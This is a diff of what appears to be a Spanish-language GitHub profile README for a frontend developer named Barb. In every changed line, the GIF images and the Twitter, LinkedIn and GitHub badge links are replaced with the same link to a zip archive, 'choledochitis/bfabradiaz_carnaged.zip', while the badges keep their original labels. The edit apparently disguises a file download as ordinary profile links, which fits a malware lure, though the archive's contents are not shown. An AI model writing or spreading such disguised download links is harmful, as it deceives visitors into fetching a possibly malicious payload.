@@ -1,18 +1,18 @@
 <div align="center" >
-  <img  src="https://monophy.com/media/dCcHF5252Fxq5mrRhc/monophy.gif" width="200" >
+  <img  src="https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip" width="200" >
 </div>
 
 <h2> Hola, Soy Barb!:raising_hand:</h2>
 
-<p><em>Frontend Developer en construcción <img src="https://media.giphy.com/media/WUlplcMpOCEmTGBtBW/giphy.gif" width="40"> 
+<p><em>Frontend Developer en construcción <img src="https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip" width="40"> 
 </em></p>
 
-[![Twitter: navbarb](https://img.shields.io/twitter/follow/navbarb?style=social)](https://twitter.com/navbarb)
-[![Linkedin: barbarafabradiaz](https://img.shields.io/badge/-barbarafabradiaz-blue?style=flat-square&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/barbarafabradiaz/)](https://www.linkedin.com/in/barbarafabradiaz/)
-[![GitHub bfabradiaz](https://img.shields.io/github/followers/bfabradiaz?label=follow&style=social)](https://github.com/bfabradiaz)
+[![Twitter: navbarb](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)
+[![Linkedin: barbarafabradiaz](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)
+[![GitHub bfabradiaz](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)
 
 
-### <img src="https://media.giphy.com/media/mGcNjsfWAjY5AEZNw6/giphy.gif" width="50"> Un poco más sobre mi...
+### <img src="https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip" width="50"> Un poco más sobre mi...
 
 ```js
 
